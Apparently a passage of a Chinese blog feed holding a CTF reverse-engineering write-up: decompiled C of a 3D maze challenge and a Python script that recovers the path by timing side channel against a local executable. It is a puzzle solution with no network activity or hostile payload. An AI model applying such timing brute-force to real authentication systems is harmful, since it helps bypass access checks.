<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// r8</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> pos; <span class="comment">// [rsp+20h] [rbp-98h]</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">112</span>]; <span class="comment">// [rsp+30h] [rbp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  pos = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(Str, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">  print(<span class="string">&quot;Welcome to this sign in problem.\n&quot;</span>, argv, envp);</span><br><span class="line">  print(<span class="string">&quot;Give me your input:&quot;</span>, v3, v4);</span><br><span class="line">  print_0(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  <span class="keyword">for</span> ( step = <span class="number">0</span>; ; ++step )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( step &gt;= <span class="built_in">strlen</span>(Str) )</span><br><span class="line">      quit();</span><br><span class="line">    Sleep(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="keyword">switch</span> ( Str[step] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = (pos &gt;&gt; <span class="number">31</span>) &amp; <span class="number">7</span>;</span><br><span class="line">          <span class="keyword">if</span> ( pos % <span class="number">8</span> - <span class="number">1</span> &lt; <span class="number">0</span> )</span><br><span class="line">            quit();</span><br><span class="line">          <span class="keyword">if</span> ( (*maze)[pos - <span class="number">1</span>] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          --pos;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = (pos &gt;&gt; <span class="number">31</span>) &amp; <span class="number">7</span>;</span><br><span class="line">          <span class="keyword">if</span> ( pos % <span class="number">8</span> + <span class="number">1</span> &gt;= <span class="number">8</span> )</span><br><span class="line">            quit();</span><br><span class="line">          <span class="keyword">if</span> ( (*maze)[pos + <span class="number">1</span>] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          ++pos;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( pos - <span class="number">64</span> &lt; <span class="number">0</span> )</span><br><span class="line">            quit();</span><br><span class="line">          <span class="keyword">if</span> ( (*maze)[pos - <span class="number">64</span>] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          pos -= <span class="number">64</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = (pos &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">          <span class="keyword">if</span> ( pos % <span class="number">64</span> + <span class="number">8</span> &gt;= <span class="number">64</span> )</span><br><span class="line">            quit();</span><br><span class="line">          <span class="keyword">if</span> ( (*maze)[pos + <span class="number">8</span>] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          pos += <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( pos + <span class="number">64</span> &gt;= <span class="number">512</span> )</span><br><span class="line">            quit();</span><br><span class="line">          <span class="keyword">if</span> ( (*maze)[pos + <span class="number">64</span>] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          pos += <span class="number">64</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = (pos &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">          <span class="keyword">if</span> ( pos % <span class="number">64</span> - <span class="number">8</span> &lt; <span class="number">0</span> )</span><br><span class="line">            quit();</span><br><span class="line">          <span class="keyword">if</span> ( (*maze)[pos - <span class="number">8</span>] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          pos -= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        quit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( pos == <span class="number">436</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  print(<span class="string">&quot;Good job, the flag is md5_32_lower(your input)&quot;</span>, v5, v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果不想盯着迷宫硬解的话 也可以用时间侧信道进行爆破 只需要添加几个条件 例如不能重复一个步骤 不能在一步后进行相反的一步:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess, threading, time, copy</span><br><span class="line"></span><br><span class="line">times = &#123;&#125;</span><br><span class="line">stdouts = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">arg, c</span>):</span><br><span class="line">    t1 = time.time()</span><br><span class="line">    proc = subprocess.Popen([<span class="string">&#x27;bzff\\Maze.exe&#x27;</span>], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="literal">True</span>)</span><br><span class="line">    stdout, stderr = proc.communicate(<span class="built_in">input</span>=arg)</span><br><span class="line">    cost = time.time() - t1</span><br><span class="line">    times[c] = cost</span><br><span class="line">    stdouts[c] = stdout[-<span class="number">4</span>:]</span><br><span class="line">    <span class="keyword">return</span> stdout</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_thread_exit</span>(<span class="params">threads</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(<span class="keyword">not</span> thread.is_alive() <span class="keyword">for</span> thread <span class="keyword">in</span> threads):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="comment"># times = &#123;&#125;</span></span><br><span class="line"><span class="comment"># for i in range(0x40):</span></span><br><span class="line"><span class="comment">#     input_content = i * &#x27;_&#x27;</span></span><br><span class="line"><span class="comment">#     t1 = time.time()</span></span><br><span class="line"><span class="comment">#     proc = subprocess.Popen([elf, input_content], stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#     stdout, stderr = proc.communicate()</span></span><br><span class="line"><span class="comment">#     cost = time.time() - t1</span></span><br><span class="line"><span class="comment">#     times[str(i)] = cost</span></span><br><span class="line"><span class="comment"># print(times)</span></span><br><span class="line">flag = [<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]</span><br><span class="line">oppsite = &#123;<span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;u&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+]Now: <span class="subst">&#123;<span class="string">&quot;&quot;</span>.join(flag)&#125;</span>&#x27;</span>)</span><br><span class="line">    char_table = <span class="string">&#x27;wasdun&#x27;</span>.replace(flag[-<span class="number">1</span>], <span class="string">&#x27;&#x27;</span>).replace(oppsite[flag[-<span class="number">1</span>]], <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> char_table:</span><br><span class="line">        char_table2 = char_table.replace(a, <span class="string">&#x27;&#x27;</span>).replace(oppsite[a], <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> char_table2:</span><br><span class="line">            input_content = copy.deepcopy(flag)</span><br><span class="line">            input_content += [a, c]</span><br><span class="line">            input_content = <span class="string">&#x27;&#x27;</span>.join(input_content)</span><br><span class="line">            t = threading.Thread(target=run, args=(input_content, a+c))</span><br><span class="line">            threads.append(t)</span><br><span class="line">            t.start()</span><br><span class="line">    check_thread_exit(threads)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;put)&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> [stdouts[c] <span class="keyword">for</span> c <span class="keyword">in</span> stdouts]:</span><br><span class="line">        most_likely = <span class="built_in">sorted</span>(times.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">True</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        flag += <span class="built_in">list</span>(most_likely)[<span class="number">0</span>]</span><br><span class="line">        stdouts.clear()</span><br><span class="line">        times.clear()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n[+]Solution found:&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag), end=<span class="string">&#x27;\nRest in :&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(stdouts)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>侧信道</tag>
      </tags>
  </entry>
</search>
